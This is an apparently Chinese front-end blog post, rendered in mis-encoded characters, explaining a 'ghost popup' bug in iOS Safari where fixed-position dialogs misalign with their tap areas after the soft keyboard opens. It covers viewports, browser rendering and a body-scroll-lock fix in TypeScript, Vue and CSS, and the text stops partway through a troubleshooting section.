<p>æœ€è¿‘åœ¨åšç§»åŠ¨ç«¯ H5 ç™»å½•é¡µé¢æ—¶ï¼Œé‡åˆ°äº†ä¸€ä¸ªè¯¡å¼‚çš„ bugï¼šåœ¨ iOS Safari ä¸­ï¼Œå¼¹çª—æ˜æ˜æ˜¾ç¤ºåœ¨å±å¹•ä¸­å¤®ï¼Œç‚¹å‡»æŒ‰é’®å´æ¯«æ— ååº”ã€‚æ£€æŸ¥å…ƒç´ åå‘ç°ï¼ŒDOM çš„å®é™…ä½ç½®å’Œè§†è§‰ä½ç½®å®Œå…¨å¯¹ä¸ä¸Šã€‚æŠ˜è…¾äº†ä¸€ç•ªåç»ˆäºææ¸…æ¥šäº†åŸå› ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p>
</blockquote>
<h2 data-id="heading-0">é—®é¢˜ç°è±¡</h2>
<p>æˆ‘ä»¬çš„ç™»å½•æ¨¡å—æœ‰ä¸¤ä¸ªé¡µé¢ï¼šè´¦å·å¯†ç ç™»å½•å’ŒéªŒè¯ç ç™»å½•ï¼Œå¯ä»¥äº’ç›¸åˆ‡æ¢ã€‚ä¸¤ä¸ªé¡µé¢éƒ½æœ‰ä¸€ä¸ªåè®®ç¡®è®¤å¼¹çª—ï¼Œä½¿ç”¨ <code>position: fixed</code> å®šä½ã€‚</p>
<p>è¯¡å¼‚çš„äº‹æƒ…å‘ç”Ÿäº†ï¼š</p>
<ol>
<li>åœ¨è´¦å·å¯†ç é¡µé¢è¾“å…¥æ‰‹æœºå·ï¼ˆè½¯é”®ç›˜å¼¹å‡ºï¼‰ï¼Œè§¦å‘å¼¹çª—ï¼Œç‚¹å‡»å–æ¶ˆ â€”â€” <strong>æ­£å¸¸</strong></li>
<li>åˆ‡æ¢åˆ°éªŒè¯ç é¡µé¢ï¼Œè§¦å‘å¼¹çª—ï¼Œç‚¹å‡»å–æ¶ˆ â€”â€” <strong>æ­£å¸¸</strong></li>
<li>å†åˆ‡æ¢å›è´¦å·å¯†ç é¡µé¢ï¼Œè§¦å‘å¼¹çª—ï¼Œç‚¹å‡»å–æ¶ˆ â€”â€” <strong>æ²¡ååº”ï¼</strong></li>
</ol>
<p>æ‰“å¼€ Safari è°ƒè¯•å™¨ä¸€çœ‹ï¼Œå¼¹çª—çš„ DOM ä½ç½®å’Œå±å¹•ä¸Šæ˜¾ç¤ºçš„ä½ç½®å·®äº†å¥½å‡ ç™¾åƒç´ ã€‚ç‚¹å‡»äº‹ä»¶å®é™…è§¦å‘åœ¨äº†ç©ºç™½åŒºåŸŸã€‚</p>
<p>è¿™å°±æ˜¯ä¼ è¯´ä¸­çš„"å¹½çµå¼¹çª—"ã€‚</p>
<hr/>
<h2 data-id="heading-1">å‰ç½®çŸ¥è¯†ï¼šç†è§£ç§»åŠ¨ç«¯è§†å£</h2>
<p>è¦ææ¸…æ¥šè¿™ä¸ªé—®é¢˜ï¼Œå¾—å…ˆç†è§£ç§»åŠ¨ç«¯æµè§ˆå™¨çš„è§†å£æ¦‚å¿µã€‚è¿™éƒ¨åˆ†å†…å®¹ç¨å¾®æœ‰ç‚¹ç»•ï¼Œä½†ç†è§£äº†ä¹‹åå¾ˆå¤šç§»åŠ¨ç«¯çš„å‘å°±éƒ½èƒ½è§£é‡Šäº†ã€‚</p>
<h3 data-id="heading-2">ä¸‰ç§è§†å£</h3>
<p>ç§»åŠ¨ç«¯æµè§ˆå™¨æœ‰ä¸‰ç§è§†å£ï¼š</p>
<h4 data-id="heading-3">1. å¸ƒå±€è§†å£ï¼ˆLayout Viewportï¼‰</h4>
<p>å¸ƒå±€è§†å£æ˜¯ CSS å¸ƒå±€çš„åŸºå‡†ã€‚å½“ä½ å†™ <code>width: 100%</code> æ—¶ï¼Œè¿™ä¸ª 100% å°±æ˜¯ç›¸å¯¹äºå¸ƒå±€è§†å£çš„å®½åº¦ã€‚</p>
<p>åœ¨æ²¡æœ‰ <code>&lt;meta name="viewport"&gt;</code> æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œç§»åŠ¨ç«¯æµè§ˆå™¨çš„å¸ƒå±€è§†å£é»˜è®¤æ˜¯ 980pxï¼ˆä¸åŒæµè§ˆå™¨å¯èƒ½ç•¥æœ‰å·®å¼‚ï¼‰ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ—©æœŸçš„æ¡Œé¢ç½‘é¡µåœ¨æ‰‹æœºä¸Šçœ‹èµ·æ¥ç‰¹åˆ«å° â€”â€” æµè§ˆå™¨æŠŠ 980px çš„å†…å®¹ç¡¬å¡è¿›äº† 320px çš„å±å¹•ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- è¿™è¡Œä»£ç è®©å¸ƒå±€è§†å£ç­‰äºè®¾å¤‡å®½åº¦ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">2. è§†è§‰è§†å£ï¼ˆVisual Viewportï¼‰</h4>
<p>è§†è§‰è§†å£æ˜¯ç”¨æˆ·å½“å‰èƒ½çœ‹åˆ°çš„åŒºåŸŸã€‚å½“ç”¨æˆ·åŒæŒ‡ç¼©æ”¾é¡µé¢æ—¶ï¼Œå¸ƒå±€è§†å£ä¸å˜ï¼Œä½†è§†è§‰è§†å£ä¼šå˜å°ï¼ˆæ”¾å¤§æ—¶ï¼‰æˆ–å˜å¤§ï¼ˆç¼©å°æ—¶ï¼‰ã€‚</p>
<p>å¯ä»¥è¿™æ ·ç†è§£ï¼šå¸ƒå±€è§†å£æ˜¯ä¸€å¼ å¤§åœ°å›¾ï¼Œè§†è§‰è§†å£æ˜¯ä½ æ‰‹é‡Œçš„æ”¾å¤§é•œã€‚æ”¾å¤§é•œç§»åŠ¨æˆ–ç¼©æ”¾ï¼Œåœ°å›¾æœ¬èº«ä¸ä¼šå˜ã€‚</p>
<h4 data-id="heading-5">3. ç†æƒ³è§†å£ï¼ˆIdeal Viewportï¼‰</h4>
<p>ç†æƒ³è§†å£æ˜¯è®¾å¤‡å±å¹•çš„å®é™…å°ºå¯¸ã€‚<code>width=device-width</code> å°±æ˜¯è®©å¸ƒå±€è§†å£ç­‰äºç†æƒ³è§†å£ã€‚</p>
<h3 data-id="heading-6">ç”¨ä»£ç è·å–è§†å£ä¿¡æ¯</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¸ƒå±€è§†å£</span>
<span class="hljs-keyword">const</span> layoutWidth = <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span>;
<span class="hljs-keyword">const</span> layoutHeight = <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span>;

<span class="hljs-comment">// è§†è§‰è§†å£ï¼ˆéœ€è¦ Visual Viewport APIï¼‰</span>
<span class="hljs-keyword">const</span> visualWidth = <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>?.<span class="hljs-property">width</span>;
<span class="hljs-keyword">const</span> visualHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>?.<span class="hljs-property">height</span>;
<span class="hljs-keyword">const</span> offsetTop = <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>?.<span class="hljs-property">offsetTop</span>; <span class="hljs-comment">// è§†è§‰è§†å£ç›¸å¯¹äºå¸ƒå±€è§†å£çš„åç§»</span>

<span class="hljs-comment">// å±å¹•å°ºå¯¸</span>
<span class="hljs-keyword">const</span> screenWidth = <span class="hljs-variable language_">window</span>.<span class="hljs-property">screen</span>.<span class="hljs-property">width</span>;
<span class="hljs-keyword">const</span> screenHeight = <span class="hljs-variable language_">window</span>.<span class="hljs-property">screen</span>.<span class="hljs-property">height</span>;
</code></pre>
<h3 data-id="heading-7">è§†å£ä¸ position: fixed çš„å…³ç³»</h3>
<p>è¿™é‡Œæ˜¯å…³é”®ç‚¹ï¼š<strong><code>position: fixed</code> çš„å…ƒç´ æ˜¯ç›¸å¯¹äºè§†è§‰è§†å£å®šä½çš„ï¼Œä½†å®ƒçš„ç‚¹å‡»åŒºåŸŸæ˜¯æ ¹æ®å¸ƒå±€è§†å£è®¡ç®—çš„</strong>ã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œè§†è§‰è§†å£å’Œå¸ƒå±€è§†å£æ˜¯é‡åˆçš„ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ã€‚ä½†å½“è½¯é”®ç›˜å¼¹å‡ºæ—¶ï¼ŒiOS Safari ä¼šæ”¹å˜è§†è§‰è§†å£è€Œä¸æ”¹å˜å¸ƒå±€è§†å£ï¼Œè¿™å°±å¯¼è‡´äº†è§†è§‰ä½ç½®å’Œç‚¹å‡»åŒºåŸŸçš„é”™ä½ã€‚</p>
<hr/>
<h2 data-id="heading-8">æµè§ˆå™¨æ¸²æŸ“åŸç†ï¼šä¸ºä»€ä¹ˆä¼š"é”™ä½"</h2>
<p>è¦ç†è§£"å¹½çµå¼¹çª—"ï¼Œè¿˜éœ€è¦äº†è§£æµè§ˆå™¨æ˜¯æ€ä¹ˆæ¸²æŸ“é¡µé¢çš„ã€‚</p>
<h3 data-id="heading-9">æ¸²æŸ“æµæ°´çº¿</h3>
<p>æµè§ˆå™¨æ¸²æŸ“ä¸€ä¸ªé¡µé¢å¤§è‡´ç»è¿‡ä»¥ä¸‹æ­¥éª¤ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">HTML</span> â†’ DOM Tree
              â†˜
                â†’ Render Tree â†’ Layout â†’ Paint â†’ Composite
              â†—
CSS  â†’ CSSOM
</code></pre>
<ol>
<li><strong>è§£æ HTML</strong>ï¼šæ„å»º DOM æ ‘</li>
<li><strong>è§£æ CSS</strong>ï¼šæ„å»º CSSOMï¼ˆCSS Object Modelï¼‰</li>
<li><strong>åˆå¹¶</strong>ï¼šDOM + CSSOM = Render Treeï¼ˆæ¸²æŸ“æ ‘ï¼‰</li>
<li><strong>å¸ƒå±€ï¼ˆLayout/Reflowï¼‰</strong>ï¼šè®¡ç®—æ¯ä¸ªå…ƒç´ çš„ä½ç½®å’Œå¤§å°</li>
<li><strong>ç»˜åˆ¶ï¼ˆPaintï¼‰</strong>ï¼šæŠŠå…ƒç´ ç”»åˆ°å±å¹•ä¸Š</li>
<li><strong>åˆæˆï¼ˆCompositeï¼‰</strong>ï¼šæŠŠä¸åŒå›¾å±‚åˆå¹¶</li>
</ol>
<h3 data-id="heading-10">é‡æ’ï¼ˆReflowï¼‰ä¸é‡ç»˜ï¼ˆRepaintï¼‰</h3>
<h4 data-id="heading-11">é‡æ’ï¼ˆReflowï¼‰</h4>
<p>å½“å…ƒç´ çš„å‡ ä½•å±æ€§ï¼ˆä½ç½®ã€å¤§å°ï¼‰å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæµè§ˆå™¨éœ€è¦é‡æ–°è®¡ç®—å¸ƒå±€ï¼Œè¿™å°±æ˜¯é‡æ’ã€‚</p>
<p>è§¦å‘é‡æ’çš„æ“ä½œï¼š</p>
<ul>
<li>æ”¹å˜çª—å£å¤§å°</li>
<li>æ”¹å˜å­—ä½“å¤§å°</li>
<li>æ·»åŠ /åˆ é™¤ DOM å…ƒç´ </li>
<li>æ”¹å˜å…ƒç´ çš„ <code>width</code>ã€<code>height</code>ã€<code>margin</code>ã€<code>padding</code> ç­‰</li>
<li>è¯»å–æŸäº›å±æ€§ï¼š<code>offsetTop</code>ã€<code>scrollTop</code>ã€<code>clientTop</code>ã€<code>getComputedStyle()</code> ç­‰</li>
</ul>
<h4 data-id="heading-12">é‡ç»˜ï¼ˆRepaintï¼‰</h4>
<p>å½“å…ƒç´ çš„å¤–è§‚ï¼ˆé¢œè‰²ã€èƒŒæ™¯ã€é˜´å½±ç­‰ï¼‰å‘ç”Ÿå˜åŒ–ï¼Œä½†å‡ ä½•å±æ€§ä¸å˜æ—¶ï¼Œåªéœ€è¦é‡ç»˜ï¼Œä¸éœ€è¦é‡æ’ã€‚</p>
<p>è§¦å‘é‡ç»˜çš„æ“ä½œï¼š</p>
<ul>
<li>æ”¹å˜ <code>color</code>ã€<code>background</code>ã€<code>visibility</code> ç­‰</li>
</ul>
<h4 data-id="heading-13">æ€§èƒ½å½±å“</h4>
<p>é‡æ’çš„ä»£ä»·æ¯”é‡ç»˜å¤§å¾—å¤šï¼Œå› ä¸ºé‡æ’ä¼šå¯¼è‡´æ•´ä¸ªæ¸²æŸ“æ ‘çš„é‡æ–°è®¡ç®—ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦å°½é‡é¿å…é¢‘ç¹è§¦å‘é‡æ’ã€‚</p>
<h3 data-id="heading-14">å›¾å±‚ï¼ˆLayerï¼‰ä¸åˆæˆ</h3>
<p>ç°ä»£æµè§ˆå™¨ä¼šæŠŠé¡µé¢åˆ†æˆå¤šä¸ªå›¾å±‚ï¼Œæ¯ä¸ªå›¾å±‚ç‹¬ç«‹æ¸²æŸ“ï¼Œæœ€ååˆæˆåˆ°ä¸€èµ·ã€‚æŸäº› CSS å±æ€§ä¼šè§¦å‘å…ƒç´ æå‡ä¸ºç‹¬ç«‹å›¾å±‚ï¼š</p>
<ul>
<li><code>transform</code></li>
<li><code>opacity</code></li>
<li><code>will-change</code></li>
<li><code>position: fixed</code>ï¼ˆåœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼‰</li>
</ul>
<p>ç‹¬ç«‹å›¾å±‚çš„å¥½å¤„æ˜¯ï¼šå½“è¿™ä¸ªå…ƒç´ å˜åŒ–æ—¶ï¼Œä¸ä¼šå½±å“å…¶ä»–å›¾å±‚ï¼Œåªéœ€è¦é‡æ–°åˆæˆï¼Œä¸éœ€è¦é‡æ’æ•´ä¸ªé¡µé¢ã€‚</p>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨è§£å†³æ–¹æ¡ˆä¸­ä½¿ç”¨ <code>transform: translate3d(0, 0, 0)</code> â€”â€” å®ƒå¼ºåˆ¶åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„åˆæˆå±‚ï¼Œè®©å¼¹çª—çš„æ¸²æŸ“ä¸é¡µé¢å…¶ä»–éƒ¨åˆ†éš”ç¦»ã€‚</p>
<hr/>
<h2 data-id="heading-15">é—®é¢˜æ ¹å› æ·±åº¦åˆ†æ</h2>
<p>ç°åœ¨æˆ‘ä»¬æœ‰äº†è¶³å¤Ÿçš„èƒŒæ™¯çŸ¥è¯†ï¼Œæ¥æ·±å…¥åˆ†æ"å¹½çµå¼¹çª—"çš„æˆå› ã€‚</p>
<h3 data-id="heading-16">iOS Safari çš„"ç‹¬ç‰¹"å¤„ç†æ–¹å¼</h3>
<p>å½“è½¯é”®ç›˜å¼¹å‡ºæ—¶ï¼Œä¸åŒå¹³å°çš„å¤„ç†æ–¹å¼ä¸åŒï¼š</p>
<p><strong>Android Chrome çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">è½¯é”®ç›˜å¼¹å‡ºå‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     â”‚
â”‚   Layout Viewport   â”‚ = Visual Viewport
â”‚   (<span class="hljs-number">100vh</span>)           â”‚
â”‚                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

è½¯é”®ç›˜å¼¹å‡ºåï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Layout Viewport   â”‚ = Visual Viewportï¼ˆç¼©å°äº†ï¼‰
â”‚   (å˜å°äº†)           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚      è½¯é”®ç›˜          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>Android çš„åšæ³•æ˜¯ç¼©å°å¸ƒå±€è§†å£ï¼Œ<code>position: fixed</code> çš„å…ƒç´ ä¼šç›¸å¯¹äºæ–°çš„è§†å£é‡æ–°å®šä½ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚</p>
<p><strong>iOS Safari çš„åšæ³•ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">è½¯é”®ç›˜å¼¹å‡ºå‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     â”‚
â”‚   Layout Viewport   â”‚ = Visual Viewport
â”‚   (<span class="hljs-number">100vh</span>)           â”‚
â”‚                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

è½¯é”®ç›˜å¼¹å‡ºåï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â† Layout Viewportï¼ˆä¸å˜ï¼‰
â”‚   â†‘                 â”‚
â”‚   â”‚ é¡µé¢è¢«æ¨ä¸Šå»     â”‚
â”‚   â†“                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â† Visual Viewportï¼ˆå˜å°äº†ï¼‰
â”‚      è½¯é”®ç›˜          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>iOS ä¿æŒå¸ƒå±€è§†å£ä¸å˜ï¼Œåªæ˜¯æŠŠé¡µé¢å†…å®¹å¾€ä¸Š"æ¨"ã€‚è¿™æ—¶å€™ï¼š</p>
<ul>
<li><code>position: fixed</code> çš„å…ƒç´ æ ¹æ®å¸ƒå±€è§†å£è®¡ç®—ä½ç½®</li>
<li>ä½†ç”¨æˆ·çœ‹åˆ°çš„æ˜¯è§†è§‰è§†å£</li>
<li>ä¸¤è€…ä¸ä¸€è‡´ï¼Œå°±å‡ºç°äº†"å¹½çµ"ç°è±¡</li>
</ul>
<h3 data-id="heading-17">ä¸ºä»€ä¹ˆå¤šæ¬¡åˆ‡æ¢åæ‰å‡ºé—®é¢˜ï¼Ÿ</h3>
<p>æ¯æ¬¡è½¯é”®ç›˜å¼¹å‡ºï¼Œ<code>window.scrollY</code> éƒ½ä¼šäº§ç”Ÿå˜åŒ–ã€‚å½“ç”¨æˆ·åœ¨å¤šä¸ªé¡µé¢ä¹‹é—´åˆ‡æ¢æ—¶ï¼š</p>
<ol>
<li>é¡µé¢ Aï¼šè½¯é”®ç›˜å¼¹å‡ºï¼Œ<code>scrollY = 200</code></li>
<li>åˆ‡æ¢åˆ°é¡µé¢ Bï¼š<code>scrollY</code> å¯èƒ½æ²¡æœ‰å®Œå…¨é‡ç½®</li>
<li>é¡µé¢ Bï¼šè½¯é”®ç›˜å¼¹å‡ºï¼Œ<code>scrollY</code> ç´¯åŠ </li>
<li>åˆ‡æ¢å›é¡µé¢ Aï¼šç´¯ç§¯çš„åç§»é‡å¯¼è‡´è®¡ç®—é”™è¯¯</li>
</ol>
<p>Vue Router çš„ <code>router.replace()</code> ä¸ä¼šè§¦å‘å®Œæ•´çš„é¡µé¢åˆ·æ–°ï¼Œæ»šåŠ¨çŠ¶æ€ä¼šæ®‹ç•™ã€‚</p>
<h3 data-id="heading-18">ä¸ºä»€ä¹ˆ iOS Chrome ä¹Ÿæœ‰é—®é¢˜ï¼Ÿ</h3>
<p>è¿™é‡Œè¦æä¸€ä¸ªå¾ˆå¤šäººä¸çŸ¥é“çš„äº‹å®ï¼š<strong>iOS ä¸Šæ‰€æœ‰æµè§ˆå™¨éƒ½æ˜¯ Safari å¥—å£³</strong>ã€‚</p>
<p>Apple çš„ App Store æ”¿ç­–è¦æ±‚ï¼šiOS ä¸Šçš„æ‰€æœ‰æµè§ˆå™¨å¿…é¡»ä½¿ç”¨ WebKit å¼•æ“ã€‚æ‰€ä»¥ï¼š</p>






























<table><thead><tr><th>æµè§ˆå™¨</th><th>Android å¼•æ“</th><th>iOS å¼•æ“</th></tr></thead><tbody><tr><td>Chrome</td><td>Blink</td><td>WebKit</td></tr><tr><td>Firefox</td><td>Gecko</td><td>WebKit</td></tr><tr><td>Edge</td><td>Blink</td><td>WebKit</td></tr><tr><td>Safari</td><td>-</td><td>WebKit</td></tr></tbody></table>
<p>iOS ä¸Šçš„ Chrome åªæ˜¯æ¢äº†ä¸ª UI çš„ Safariï¼Œåº•å±‚æ¸²æŸ“å¼•æ“å®Œå…¨ä¸€æ ·ã€‚è¿™ä¸ªé—®é¢˜åœ¨ iOS ä¸Šæ˜¯æ— å·®åˆ«æ”»å‡»ã€‚</p>
<hr/>
<h2 data-id="heading-19">è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-20">æ ¸å¿ƒæ€è·¯</h3>
<p>å¼¹çª—æ˜¾ç¤ºæ—¶ï¼ŒæŠŠé¡µé¢"å†»ä½"ï¼Œè®©å¸ƒå±€è§†å£å’Œè§†è§‰è§†å£å¼ºåˆ¶ä¿æŒä¸€è‡´ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> savedScrollY = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> savedBodyStyle = <span class="hljs-string">''</span>;

<span class="hljs-comment">// é”å®š</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">lockBodyScroll</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// å…¼å®¹æ€§å†™æ³•ï¼Œç¡®ä¿èƒ½è·å–åˆ°æ»šåŠ¨ä½ç½®</span>
  savedScrollY = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">pageYOffset</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> || <span class="hljs-number">0</span>;
  savedBodyStyle = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span>;

  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">`
    <span class="hljs-subst">${savedBodyStyle}</span>;
    position: fixed;
    top: -<span class="hljs-subst">${savedScrollY}</span>px;
    left: 0;
    right: 0;
    width: 100%;
    overflow: hidden;
  `</span>;
};

<span class="hljs-comment">// è§£é”</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">unlockBodyScroll</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = savedBodyStyle;
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, savedScrollY);
};
</code></pre>
<p><strong>åŸç†è§£æï¼š</strong></p>
<ol>
<li><code>position: fixed</code> è®© body è„±ç¦»æ–‡æ¡£æµï¼Œä¸å†æ»šåŠ¨</li>
<li><code>top: -${savedScrollY}px</code> ç”¨è´Ÿå€¼è¡¥å¿å½“å‰æ»šåŠ¨ä½ç½®ï¼Œä¿æŒè§†è§‰ä¸€è‡´</li>
<li><code>overflow: hidden</code> ç¦æ­¢æ»šåŠ¨</li>
<li>å…³é—­å¼¹çª—æ—¶æ¢å¤åŸå§‹æ ·å¼ï¼Œå¹¶ç”¨ <code>scrollTo</code> æ¢å¤æ»šåŠ¨ä½ç½®</li>
</ol>
<h3 data-id="heading-21">Vue ç»„ä»¶ä¸­çš„ä½¿ç”¨</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { watch, toRefs, nextTick } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> props = defineProps&lt;{ <span class="hljs-attr">show</span>: <span class="hljs-built_in">boolean</span> }&gt;();
<span class="hljs-keyword">const</span> { show } = <span class="hljs-title function_">toRefs</span>(props);

<span class="hljs-title function_">watch</span>(show, <span class="hljs-function">(<span class="hljs-params">val</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (val) {
    <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">lockBodyScroll</span>();
    });
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_">unlockBodyScroll</span>();
  }
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> });

<span class="hljs-comment">// ç»„ä»¶å¸è½½æ—¶ç¡®ä¿è§£é”ï¼Œé˜²æ­¢çŠ¶æ€æ®‹ç•™</span>
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (show.<span class="hljs-property">value</span>) {
    <span class="hljs-title function_">unlockBodyScroll</span>();
  }
});
</code></pre>
<h3 data-id="heading-22">CSS ä¼˜åŒ–</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-class">.dialog-overlay</span> {
  <span class="hljs-attribute">position</span>: fixed;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;

  <span class="hljs-comment">// åŠ¨æ€è§†å£é«˜åº¦ï¼ŒiOS 15+ æ”¯æŒ</span>
  <span class="hljs-comment">// ä¼šéšè½¯é”®ç›˜å¼¹å‡ºè‡ªåŠ¨è°ƒæ•´</span>
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100</span>dvh;

  <span class="hljs-comment">// å¼ºåˆ¶åˆ›å»ºç‹¬ç«‹åˆæˆå±‚</span>
  <span class="hljs-comment">// è®©å¼¹çª—çš„æ¸²æŸ“ä¸é¡µé¢éš”ç¦»</span>
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate3d</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  -webkit-<span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate3d</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

  <span class="hljs-comment">// ç¦ç”¨è§¦æ‘¸æ»šåŠ¨æ‰‹åŠ¿</span>
  touch-action: none;
  -webkit-touch-callout: none;

  <span class="hljs-comment">// é˜²æ­¢æ»šåŠ¨ç©¿é€åˆ°çˆ¶å…ƒç´ </span>
  overscroll-behavior: contain;
}
</code></pre>
<p><strong>CSS å±æ€§è§£æï¼š</strong></p>

























<table><thead><tr><th>å±æ€§</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>100dvh</code></td><td>åŠ¨æ€è§†å£é«˜åº¦ï¼Œä¼šéšè½¯é”®ç›˜å˜åŒ–</td></tr><tr><td><code>transform: translate3d(0,0,0)</code></td><td>è§¦å‘ GPU åŠ é€Ÿï¼Œåˆ›å»ºç‹¬ç«‹å›¾å±‚</td></tr><tr><td><code>touch-action: none</code></td><td>ç¦ç”¨æ‰€æœ‰è§¦æ‘¸æ‰‹åŠ¿</td></tr><tr><td><code>overscroll-behavior: contain</code></td><td>æ»šåŠ¨åˆ°è¾¹ç•Œæ—¶ä¸ä¼šè§¦å‘çˆ¶å…ƒç´ æ»šåŠ¨</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-23">è¸©è¿‡çš„å‘</h2>
<h3 data-id="heading-24">å‘ 1ï¼šå¿˜è®°åœ¨ç»„ä»¶å¸è½½æ—¶è§£é”</h3>
<p>å¦‚æœç”¨æˆ·åœ¨å¼¹çª—æ‰“å¼€çŠ¶æ€ä¸‹åˆ‡æ¢é¡µé¢ï¼ˆæ¯”å¦‚ç‚¹å‡»äº†å¼¹çª—é‡Œçš„é“¾æ¥ï¼‰ï¼Œ<code>body</code> çš„ <code>fixed</code> æ ·å¼ä¼šæ®‹ç•™ï¼Œå¯¼è‡´æ–°é¡µé¢æ— æ³•æ»šåŠ¨ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> ä¸€å®šè¦åœ¨ <code>onBeforeUnmount</code> é‡Œæ¸…ç†ã€‚</p>
<h3 data-id="heading-25">å‘ 2ï¼šæ»šåŠ¨ä½ç½®æ¢å¤ä¸å‡†ç¡®</h3>
<p><code>window.scrollY</code> åœ¨æŸäº›è€æ—§æµè§ˆå™¨æˆ–ç‰¹æ®Šæƒ…å†µä¸‹å¯èƒ½æ˜¯ <code>undefined</code>ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> ä½¿ç”¨å…¼å®¹æ€§å†™æ³•ï¼š</p>
